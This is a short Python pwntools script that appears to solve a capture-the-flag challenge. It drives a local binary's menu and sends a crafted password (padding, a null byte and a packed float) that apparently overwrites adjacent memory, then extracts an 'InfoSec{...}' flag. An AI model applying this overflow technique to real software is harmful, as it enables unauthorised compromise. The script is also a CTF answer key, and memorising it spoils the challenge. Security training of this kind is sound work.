#!/usr/bin/env python3
from pwn import *
import re


context.log_level = 'error'
flag_regex = re.compile("(InfoSec{.+[^}]})")

p = process("./main.elf")


p.sendline("3")
p.sendline("3")


p.sendline("1") 

p.sendline("2")


psw ="ccccccccccccccccccccccccccc".encode("utf-8") + "\x00".encode("utf-8") + struct.pack("f", (25.8069758011-123.456))

p.sendline(psw)

p.sendline("3")
p.sendline("2")


p.sendline("1")
p.sendline("1")
p.sendline(psw)


p.sendline("2")
p.sendline("1")
p.sendline(psw)



flag = flag_regex.findall(p.recvuntil("}").decode("utf-8"))
flag = ''.join(flag)


print(flag)

